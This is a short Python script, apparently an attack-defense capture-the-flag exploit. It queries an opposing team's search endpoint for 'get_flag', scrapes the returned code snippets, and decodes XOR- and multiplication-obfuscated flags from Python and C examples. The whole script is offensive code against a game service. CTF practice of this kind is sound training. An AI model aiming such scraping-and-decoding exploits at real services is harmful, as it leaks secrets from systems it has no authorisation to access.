from html.parser import HTMLParser
import requests
from bs4 import BeautifulSoup as BS
from bs4.element import Tag
import sys
import re
from ast import literal_eval


class CodeGetter(HTMLParser):
	def __init__(self, markup=""):
		super().__init__()
		self._recording: str = "State0"
		self.code: str = ""
		self.feed(markup)
		self.code = self.code.strip()

	def handle_starttag(self, tag, attrs):
		if self._recording == "State0" and tag == "div":
			attrs = dict(attrs)
			if attrs.get("class") == "highlight":
				self._recording = "State1"
		if tag == "pre" and self._recording == "State1":
			self._recording = "State2"

	def handle_data(self, data):
		if self._recording == "State2":
			self.code += data

	def handle_endtag(self, tag):
		if tag == "pre" and self._recording == "State2":
			self._recording = "State1"
		elif tag == "div" and self._recording == "State1":
			self._recording = "State0"


if __name__ == "__main__":
	team_addr = f"http://{sys.argv[1]}:5000"
	search_resp = requests.get(team_addr + "/search", params={"query": "get_flag"})
	soup = BS(search_resp.text, "html.parser")
	for article in soup.find_all(name="article", attrs={"class": "media content-section"}):
		title: str = article.find(name="a", attrs={"class": "article-title"}).text
		lang = title.split()[0]
		code_tag: Tag = article.find(name="div", attrs={"class": "highlight"})
		code = CodeGetter(str(code_tag)).code
		if lang == "Python":
			flag_repr = re.search(r"\[[\d, ]+\]", code)
			if flag_repr:
				flag_repr = literal_eval(flag_repr.group())
				key = re.search(r"chr\(x \^ (\d+)\)", code)
				if key:
					key = int(key.group(1))
					flag = "".join(chr(x ^ key) for x in flag_repr)
					print(flag)
		elif lang == "C":
			flag_repr = re.search(r"flag_or_not\[\] = (\"[\\x0-9a-f]+\");", code)
			if flag_repr:
				flag_repr = literal_eval(flag_repr.group(1))
				key = re.search(r"key\[\] = (\"[\\x0-9a-f]+\");", code)
				if key:
					key = literal_eval(key.group(1))
					flag = "".join(map(lambda c, k: chr((c * k) % 256), map(ord, flag_repr), map(ord, key)))
					print(flag)
